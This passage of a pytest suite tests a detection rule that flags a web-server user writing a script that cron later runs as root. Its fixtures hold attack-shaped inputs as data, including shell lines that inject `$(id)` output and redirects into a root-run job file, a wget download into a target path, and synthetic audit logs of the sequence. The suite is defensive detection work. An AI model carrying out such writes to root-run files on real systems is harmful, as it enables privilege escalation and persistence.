    # A still-unmodelled construct (here-string) keeps the write-side evaluation partial, never a
    # clean negative.
    pb, out = run([web(["sh", "-c", f"vi {JOB} <<< edits"], "/usr/bin/dash"), *cron_runs(T0 + timedelta(minutes=10))])
    assert out == [] and pb.missing_required == 1


def test_failure_lowering_reads_every_writer_record_not_only_the_cited_ones():
    failed = [web(["tee", "-a", JOB], "/usr/bin/tee", ts=T0 + timedelta(seconds=i), outcome=Outcome.failure)
              for i in range(12)]
    late_ok = web(["tee", "-a", JOB], "/usr/bin/tee", ts=T0 + timedelta(seconds=30))
    _pb, out = run([*failed, late_ok, *cron_runs(T0 + timedelta(minutes=10))])
    assert out[0].proposed_lane == "high"                  # the 13th record (uncited) succeeded
    _pb, out = run([*failed, *cron_runs(T0 + timedelta(minutes=10))])
    assert out[0].proposed_lane == "lead"


def test_determinism_across_partition_boundaries_and_partition_order():
    events = sorted([web(*VI), web(["tee", JOB], "/usr/bin/tee", ts=T0 + timedelta(seconds=5)),
                     ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0 + timedelta(seconds=7), auid=1000),
                     *cron_runs(T0 + timedelta(minutes=10)), *cron_runs(T0 + timedelta(minutes=20), pid=5100)],
                    key=lambda e: (e.ts, e.id))

    def view(out):
        return [(m.group_key, m.claim, m.proposed_lane, [e.id for e in m.events]) for m in out]

    baseline = view(run(events)[1])
    for size in (1, 2, 3, 5):                              # chronological partitions of any size: identical output
        parts = [events[i:i + size] for i in range(0, len(events), size)]
        assert view(run(*parts)[1]) == baseline
    for seed in range(5):                                  # partitions in any order: same findings and lanes
        parts = [events[i:i + 3] for i in range(0, len(events), 3)]
        random.Random(seed).shuffle(parts)
        assert [(k, lane) for k, _c, lane, _e in view(run(*parts)[1])] == [(k, lane) for k, _c, lane, _e in baseline]


# ---------------------------------------------------------------- missing fields: partial, never a clean no-match
def test_missing_uid_and_user_is_counted_missing_not_matched():
    pb, out = run([ex(["vi", JOB], "/usr/bin/vim.basic", None, T0), *cron_runs(T0 + timedelta(minutes=10))])
    assert out == [] and pb.missing_required >= 1


def test_missing_argv_and_executable_are_missing():
    pb = NonRootWriteRootExecutedFile()
    pb.consume([ev("process_exec", T0, process__argv=[], process__user="www-data", process__uid="33",
                   process__executable="/usr/bin/vi"),
                ev("process_exec", T0, process__argv=["vi", JOB], process__user="www-data", process__uid="33")])
    assert pb.missing_required == 2 and pb.evaluated == 0


def test_relative_write_target_without_cwd_is_partial():
    pb, out = run([ex(["vi", "rotate.sh"], "/usr/bin/vim.basic", 33, T0), *cron_runs(T0 + timedelta(minutes=10))])
    assert out == [] and pb.missing_required == 1


def test_relative_root_script_without_cwd_is_partial():
    root = ex(["/bin/bash", "./rotate.sh"], "/usr/bin/bash", 0, T0 + timedelta(minutes=1), pid=700, ppid=1)
    pb, out = run([web(*VI), root])
    assert out == [] and pb.missing_required == 1


@pytest.mark.parametrize("script", [f"echo $(id) > {JOB}", f"for f in a; do echo $f >> {JOB}; done"])
def test_unmodelled_shell_text_is_partial(script):
    pb, _out = run([web(["sh", "-c", script], "/usr/bin/dash"), *cron_runs(T0 + timedelta(minutes=10))])
    assert pb.missing_required >= 1


@pytest.mark.parametrize("script", [f"echo x &> {JOB}", f"echo x &>> {JOB}", f"echo x >& {JOB}"])
def test_combined_stream_redirect_into_a_root_run_file_is_a_write(script):
    # bash: `&>` / `&>>` / `>&FILE` parse, and a redirect that writes the file root runs is detected.
    _pb, out = run([web(["bash", "-c", script], "/usr/bin/bash"), *cron_runs(T0 + timedelta(minutes=10))])
    assert len(out) == 1 and out[0].proposed_lane == "high"
    assert f"on {JOB} " in out[0].claim


@pytest.mark.parametrize("script", [f"echo x &> {JOB}", f"echo x &>> {JOB}", f"echo x >& {JOB}"])
def test_bash_only_redirect_under_dash_is_partial(script):
    # dash reads these differently (or rejects them), so the text is unevaluable rather than guessed.
    pb, out = run([web(["sh", "-c", script], "/usr/bin/dash"), *cron_runs(T0 + timedelta(minutes=10))])
    assert out == [] and pb.missing_required >= 1


def test_auth_record_without_service_is_missing():
    pb = NonRootWriteRootExecutedFile()
    pb.consume([ev("auth", T0, auth__phase="session_open", process__session_id=5)])
    assert pb.missing_required == 1


def test_file_change_without_actor_is_missing():
    pb = NonRootWriteRootExecutedFile()
    pb.consume([ev("file_change", T0, file__path=JOB)])
    assert pb.missing_required == 1 and pb.file_change_records == 0


# ---------------------------------------------------------------- grammar units
@pytest.mark.parametrize("name,args,cwd,expected", [
    ("vi", ["+12", "-c", "set nu", "/a/b"], None, ["/a/b"]),
    ("vi", ["-o2", "/a/b", "/a/c"], None, ["/a/b", "/a/c"]),
    ("sed", ["-e", "1d", "-i", "/a/b", "/a/c"], None, ["/a/b", "/a/c"]),
    ("sed", ["-E", "s/a/b/", "/a/b"], None, []),
    ("sed", ["-f", "/a/script.sed", "-i", "/a/b"], None, ["/a/b"]),
    # `-pie`: -i takes "e" as its backup extension, so the first operand is perl's script file, not code
    ("perl", ["-pie", "s/a/b/", "/a/b"], None, ["/a/b"]),
    ("tee", ["--append", "/a/b", "-"], None, ["/a/b"]),
    ("install", ["-d", "/a/b"], None, []),
    ("ln", ["-s", "/tmp/x"], "/srv", ["/srv/x"]),
    ("chown", ["-R", "www-data:", "/a/b"], None, ["/a/b"]),
    ("chmod", ["--reference=/etc/x", "/a/b"], None, ["/a/b"]),
    ("truncate", ["--size=0", "/a/b"], None, ["/a/b"]),
    ("rsync", ["-a", "/tmp/x", "example.invalid:/a/b"], None, []),  # remote destination: not a local write
    # GNU long-option abbreviations (getopt_long accepts unambiguous prefixes)
    ("sed", ["--in-pl=.b", "1d", "/a/b"], None, ["/a/b"]),
    ("sed", ["--expr=1d", "--in", "/a/b"], None, ["/a/b"]),
    ("sed", ["--quiet", "1p", "/a/b"], None, []),
    ("cp", ["--target=/a", "/tmp/b"], None, ["/a/b"]),
    ("cp", ["--no-target", "/tmp/x", "/a/b"], None, ["/a/b"]),
    ("install", ["--mo", "755", "/tmp/x", "/a/b"], None, ["/a/b"]),
    ("wget", ["--output-doc=/a/b", "http://example.invalid/x"], None, ["/a/b"]),
    ("wget", ["--output-file=/a/log", "http://example.invalid/x"], None, []),   # the log file, not the download
])
def test_write_target_grammar(name, args, cwd, expected):
    targets, _unresolved = write_targets(name, args, cwd)
    paths = [t.path for t in targets]
    assert set(expected) <= set(paths)
    if not expected:
        assert paths == []
    assert "/a/script.sed" not in paths and "s/a/b/" not in [p.rsplit("/", 1)[-1] for p in paths]


def test_schedule_config_paths():
    assert schedule_config("/etc/cron.d/x") is not None and schedule_config("/etc/cron.d") is None
    assert schedule_config("/usr/lib/systemd/system/x.timer")[1] == "T1053.006"
    assert schedule_config("/etc/cron.dx/y") is None and schedule_config("/srv/tasks/rotate.sh") is None


# ---------------------------------------------------------------- end to end through the sweep (raw audit lines)
def _audit_hit(i, ts_iso, line):
    return {"_id": f"a{i}", "_index": "romulus-host-x", "_source": {
        "@timestamp": ts_iso, "message": line, "host": {"name": "app01"},
        "event": {"dataset": "linux.audit", "original": line}}}


def test_sweep_publishes_the_join_across_partitions_with_resolvable_citations(monkeypatch):
    from romulus.hunt import sweep as sw
    from romulus.sources.models import Completeness, SearchOutcome, Window
    from romulus.store.db import make_engine, migrate
    from romulus.store.repo import Repo

    t1, t2 = 1893920400, 1893920400 + 600          # 2030-01-06 09:00Z and ten minutes later
    part1 = [
        _audit_hit(1, "2030-01-06T09:00:00Z", f'type=EXECVE msg=audit({t1}.100:501): argc=2 a0="vi" a1="{JOB}"'),
        _audit_hit(2, "2030-01-06T09:00:00Z",
                   f'type=SYSCALL msg=audit({t1}.100:501): arch=c000003e syscall=59 success=yes exit=0 ppid=3999 '
                   f'pid=4000 auid=4294967295 uid=33 euid=33 ses=4294967295 comm="vi" exe="/usr/bin/vim.basic"'
                   '\x1dUID="www-data" EUID="www-data" AUID="unset"'),
        _audit_hit(3, "2030-01-06T09:00:00Z", f'type=CWD msg=audit({t1}.100:501): cwd="/var/www/html"'),
    ]
    part2 = [
        _audit_hit(4, "2030-01-06T09:10:00Z",
                   f"type=USER_START msg=audit({t2}.000:900): pid=5000 uid=0 auid=0 ses=12 msg='op=PAM:session_open "
                   'grantors=pam_loginuid acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron '
                   "res=success'"),
        _audit_hit(5, "2030-01-06T09:10:01Z",
                   f'type=EXECVE msg=audit({t2 + 1}.000:901): argc=2 a0="/bin/bash" a1="{JOB}"'),
        _audit_hit(6, "2030-01-06T09:10:01Z",
                   f'type=SYSCALL msg=audit({t2 + 1}.000:901): arch=c000003e syscall=59 success=yes exit=0 '
                   f'ppid=5000 pid=5001 auid=0 uid=0 euid=0 ses=12 comm="bash" exe="/usr/bin/bash"'
                   '\x1dUID="root" EUID="root" AUID="root"'),
        _audit_hit(7, "2030-01-06T09:10:01Z", f'type=CWD msg=audit({t2 + 1}.000:901): cwd="/root"'),
    ]
    start = datetime(2030, 1, 6, 9, 0, tzinfo=UTC)
    windows = [Window(start=start, end=start + timedelta(minutes=5)),
               Window(start=start + timedelta(minutes=5), end=start + timedelta(minutes=15))]
    by_window = {windows[0].key(): part1, windows[1].key(): part2}

    def fake_execute(client, intent, contract):
        records = by_window[intent.window.key()]
        now = datetime.now(UTC)
        return SearchOutcome(target=intent.target, fingerprint="f", started_at=now, ended_at=now,
                             completeness=Completeness.complete, total=len(records), total_relation="eq",
                             returned=len(records), records=records)

    class FakeClient:
        version = "test"

        class settings:
            es_flavor = "elasticsearch"

    monkeypatch.setattr(sw, "execute", fake_execute)
    engine = make_engine(":memory:")
    migrate(engine)
    repo = Repo(engine)
    repo.create_hunt("h1", {"targets": ["romulus-host-x"]}, "d", "t")
    sweep = sw.Sweep(repo, FakeClient(), "h1", Window(start=start, end=windows[1].end), {"romulus-host-x": None})
    for window in windows:
        sweep.run_partition("romulus-host-x", None, [], window, est=10)
    sweep.finalize()
    found = [c for c in repo.candidates("h1") if c["rule_id"] == NonRootWriteRootExecutedFile.id]
    assert len(found) == 1 and found[0]["lane"] == "high"
    assert "the scheduler 'cron'" in found[0]["claim"]
    assert len(found[0]["event_ids"]) == 3                      # writer exec, cron session record, root exec
    cell = next(c for c in repo.rule_cells("h1")
                if c["rule_id"] == NonRootWriteRootExecutedFile.id and c["target"] == "*")
    assert cell["state"] == "matched"


# ---------------------------------------------------------------- registry and pack invariants
def test_rule_is_registered_positive_only_staged_and_attack_ids_exist():
    cls = NonRootWriteRootExecutedFile
    assert cls in ALL_PLAYBOOKS and not cls.assures_negative and cls.positive_only_reason
    assert any(isinstance(pb, cls) for pb in fresh_pack())
    assert cls.staged and cls.kind == "aggregate" and cls.anchor_class == "persistence"
    import gzip
    import json
    from pathlib import Path
    with gzip.open(Path(__file__).resolve().parents[1] / "content/attack/enterprise-attack-20.0.json.gz") as fh:
        stix = json.load(fh)
    ids = {ref["external_id"] for obj in stix["objects"] if obj.get("type") == "attack-pattern"
           and not obj.get("revoked") and not obj.get("x_mitre_deprecated")
           for ref in obj.get("external_references", []) if ref.get("source_name") == "mitre-attack"}
    assert set(cls.attack) <= ids


@pytest.mark.parametrize("name,technique", [("lsusb", "T1120"), ("lspci", "T1120"), ("lsscsi", "T1120"),
                                            ("hwinfo", "T1120"), ("usb-devices", "T1120")])
def test_peripheral_enumeration_is_a_discovery_class(name, technique):
    assert classify_discovery(name, [], None)[0] == technique
